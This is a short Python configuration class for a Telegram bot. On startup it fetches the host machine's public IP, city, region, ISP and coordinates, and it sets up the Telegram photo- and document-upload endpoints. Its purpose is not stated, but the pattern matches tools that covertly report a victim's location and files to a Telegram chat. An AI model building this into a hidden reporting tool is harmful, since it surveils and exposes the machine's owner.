import requests


class BotConfig:
    def __init__(self):
        self.BOT_TOKEN = ""
        self.CHAT_ID = ""
        self.API_URL = f"https://api.telegram.org/bot{self.BOT_TOKEN}"
        self.SEND_PHOTO_URL = f"{self.API_URL}/sendPhoto"
        self.SEND_MESSAGE_URL = f"{self.API_URL}/sendDocument"
        self.ip_data = self._fetch_ip_info()
        self.Ip = self.ip_data["ip"]
        self.city = self.ip_data["city"]
        self.region = self.ip_data["region"]
        self.country = self.ip_data["country"]
        self.org = self.ip_data["org"]
        self.latitude, self.longitude = self.ip_data["loc"].split(",")

    def _fetch_ip_info(self):
        try:
            ip = requests.get("https://api64.ipify.org?format=json", timeout=10).json()["ip"]
            info = requests.get(f"https://ipinfo.io/{ip}/json", timeout=10).json()
            return {**info, "ip": ip}
        except:
            return {"ip": "Unknown", "city": "Unknown", "region": "Unknown", "country": "Unknown", "org": "Unknown",
                    "loc": "30.0,31.0"}